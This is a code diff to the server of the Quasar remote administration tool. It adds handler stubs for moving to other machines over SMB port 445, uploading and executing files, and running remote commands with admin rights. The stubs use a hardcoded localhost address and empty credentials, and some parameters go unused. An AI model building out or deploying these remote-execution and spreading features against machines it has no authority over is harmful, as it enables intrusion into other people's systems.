@@ -9,13 +9,13 @@ using System.Windows.Forms;
 using Quasar.Server.Forms;
 using Quasar.Common.Messages.Network;
 using System.Collections;
+using System.Diagnostics;
+using System.Net;
 
 namespace Quasar.Server.Messages
 {
     public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
     {
-
-
         private readonly Client _client;
 
         public NetworkHandler(Client client) : base(true)
@@ -56,12 +56,37 @@ namespace Quasar.Server.Messages
 
         public void MoveToEntity(NetworkEntity entity)
         {
-            _client.Send(new DoClientMovement { Address = "", AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
+            _client.Send(new DoClientMovement { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
         }
 
-        public void UploadAndExecte(NetworkEntity entity)
+        public void UploadAndExecte(NetworkEntity entity, string remotePath)
         {
+            _client.Send(new DoUploadAndExecute { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
+        }
 
+        public void RemoteExecute(NetworkEntity entity, ProcessStartInfo info)
+        {
+            _client.Send(new DoRemoteCommandExecute { Address = IPAddress.Parse("127.0.0.1"), AsAdmin = true, MAC = "", Command = "", Args = new string[] { }, Username = "", Password = "", Port = 445, Share = "" });
+        }
+
+        private void Execute(ISender client, DoNetworkScanResponse message)
+        {
+            MessageBox.Show("Received Network Scan Response!");
+        }
+
+        private void Execute(ISender client, DoClientMovementResponse message)
+        {
+            MessageBox.Show("Received Client Movement Response!");
+        }
+
+        private void Execute(ISender client, DoRemoteCommandExecuteResponse message)
+        {
+            MessageBox.Show("Received Remote Command Response!");
+        }
+
+        private void Execute(ISender client, DoUploadAndExecuteResponse message)
+        {
+            MessageBox.Show("Received Upload and Execute Response!");
         }
     }
 }
